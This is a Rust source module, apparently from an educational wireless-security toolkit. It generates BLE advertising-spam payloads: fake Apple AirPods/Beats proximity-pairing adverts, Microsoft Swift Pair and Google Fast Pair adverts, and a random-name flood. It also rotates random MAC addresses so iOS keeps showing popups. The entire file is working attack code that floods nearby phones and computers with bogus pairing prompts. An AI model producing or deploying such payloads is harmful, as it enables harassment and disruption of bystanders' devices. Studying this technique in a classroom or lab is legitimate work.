//! BLE advertising-spam payload generators.
//!
//! Pure payload construction — given a mode and a rotation counter, produce the
//! raw advertising-data bytes (a sequence of `[len][type][payload..]` AD
//! structures, max 31 bytes) plus a fresh random advertiser MAC. The HCI driving
//! (set-random-addr -> set-params -> set-data -> enable) lives in `radio.rs`,
//! which owns the BLE controller.
//!
//! These reproduce the well-known proximity-pairing / pairing-popup adverts so
//! students can *see* what a "BLE spam" device floods the air with and watch a
//! scanner (our own BLE Scanner, or nRF Connect) drown in fake entries. Every
//! advert here is structurally valid; whether a given OS still pops a modal is
//! version-dependent and is the thing to verify on real hardware.

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    /// Apple "Continuity" proximity-pairing adverts (AirPods / Beats popups on iOS).
    Apple,
    /// Microsoft Swift Pair adverts ("Tap to set up" toast on Windows).
    SwiftPair,
    /// Google Fast Pair adverts (pairing sheet on Android).
    FastPair,
    /// Complete-Local-Name flood — junk names that bloat any scanner's list.
    NameFlood,
}

impl Mode {
    pub const ALL: [Mode; 4] = [Mode::Apple, Mode::SwiftPair, Mode::FastPair, Mode::NameFlood];
    pub fn label(self) -> &'static str {
        match self {
            Mode::Apple => "Apple Popup",
            Mode::SwiftPair => "Swift Pair (Win)",
            Mode::FastPair => "Fast Pair (Android)",
            Mode::NameFlood => "Name Flood",
        }
    }
}

/// Small deterministic PRNG so each rotation varies without `rand`/`Math.random`.
#[inline]
fn mix(seq: u32) -> u32 {
    let mut x = seq.wrapping_add(0x9E3779B9);
    x ^= x >> 16;
    x = x.wrapping_mul(0x21F0AAAD);
    x ^= x >> 15;
    x = x.wrapping_mul(0x735A2D97);
    x ^= x >> 15;
    x
}

/// A fresh locally-administered random advertiser address. iOS dedupes by MAC,
/// so rotating it is what keeps the popups coming.
pub fn random_mac(seq: u32) -> [u8; 6] {
    let a = mix(seq);
    let b = mix(seq ^ 0x55AA55AA);
    [
        (a as u8) | 0xC0, // top two bits set => BLE "random static" address
        (a >> 8) as u8,
        (a >> 16) as u8,
        (a >> 24) as u8,
        b as u8,
        (b >> 8) as u8,
    ]
}

/// Apple device model IDs that map to distinct proximity-pair popups.
const APPLE_MODELS: [u16; 12] = [
    0x0220, // AirPods
    0x0e20, // AirPods Pro
    0x0a20, // AirPods Max
    0x0f20, // AirPods (2nd gen)
    0x1320, // AirPods (3rd gen)
    0x1420, // AirPods Pro (2nd gen)
    0x0320, // Powerbeats3
    0x0b20, // Powerbeats Pro
    0x1120, // Beats Solo Pro
    0x1020, // Beats Studio Buds
    0x0520, // BeatsX
    0x0c20, // Beats Solo3
];

/// Junk-name alphabet for the name flood.
const NAME_CHARS: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZ0123456789!#@*";

/// Build advertising data for `mode`/`seq`. Returns `(len, buf)` where only the
/// first `len` bytes of `buf` are valid AD structures.
pub fn payload(mode: Mode, seq: u32) -> (u8, [u8; 31]) {
    let mut d = [0u8; 31];
    let r = mix(seq);
    let len = match mode {
        Mode::Apple => {
            // AD element: [len][0xFF mfg][4C 00 Apple][07 proximity-pairing][...]
            let model = APPLE_MODELS[(seq as usize) % APPLE_MODELS.len()];
            // mfg-specific element: [0xFF][4C 00 Apple][07 = proximity pairing][len=17][..17 bytes..]
            let body: [u8; 22] = [
                0xFF, 0x4C, 0x00, // mfg-specific, Apple
                0x07, 0x11, // continuity type = proximity pairing, sub-length 17
                0x01, // pairing prefix
                (model >> 8) as u8,
                (model & 0xFF) as u8,
                0x55, // status
                (r as u8) | 0x80, // battery/lid nibbles (varied per rotation)
                (r >> 8) as u8,
                (r >> 16) as u8,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            ];
            d[0] = body.len() as u8;
            d[1..1 + body.len()].copy_from_slice(&body);
            1 + body.len()
        }
        Mode::SwiftPair => {
            // [len][0xFF][06 00 Microsoft][03 00 80][name...]
            let name = b"ECHO-KBD";
            let hdr: [u8; 6] = [0xFF, 0x06, 0x00, 0x03, 0x00, 0x80];
            let total = 1 + hdr.len() + name.len(); // +1 element-length byte
            d[0] = (hdr.len() + name.len()) as u8;
            d[1..1 + hdr.len()].copy_from_slice(&hdr);
            d[1 + hdr.len()..1 + hdr.len() + name.len()].copy_from_slice(name);
            total
        }
        Mode::FastPair => {
            // Flags AD + Service-Data 0xFE2C (Fast Pair) carrying a 3-byte model id.
            let models: [[u8; 3]; 6] = [
                [0xCD, 0x82, 0x56], // "Bose QC35 II"-style id
                [0x00, 0x00, 0x07],
                [0x0E, 0x30, 0xB9],
                [0x02, 0x0E, 0x10],
                [0xF5, 0x29, 0x56],
                [0x92, 0xBB, 0xBD],
            ];
            let m = models[(seq as usize) % models.len()];
            let bytes: [u8; 9] = [
                0x02, 0x01, 0x06, // Flags: LE General Discoverable + BR/EDR not supported
                0x06, 0x16, 0x2C, 0xFE, // len, service-data 16-bit, UUID 0xFE2C
                m[0], m[1],
            ];
            // last model byte
            d[..bytes.len()].copy_from_slice(&bytes);
            d[bytes.len()] = m[2];
            bytes.len() + 1
        }
        Mode::NameFlood => {
            // Flags + a random Complete Local Name (type 0x09).
            d[0] = 0x02;
            d[1] = 0x01;
            d[2] = 0x06;
            let name_len = 8 + (r as usize % 12); // 8..=19 chars
            d[3] = (name_len + 1) as u8; // element length (type + chars)
            d[4] = 0x09; // complete local name
            let mut s = r ^ (seq.rotate_left(11));
            for i in 0..name_len {
                d[5 + i] = NAME_CHARS[(s as usize) % NAME_CHARS.len()];
                s = mix(s);
            }
            5 + name_len
        }
    };
    (len as u8, d)
}
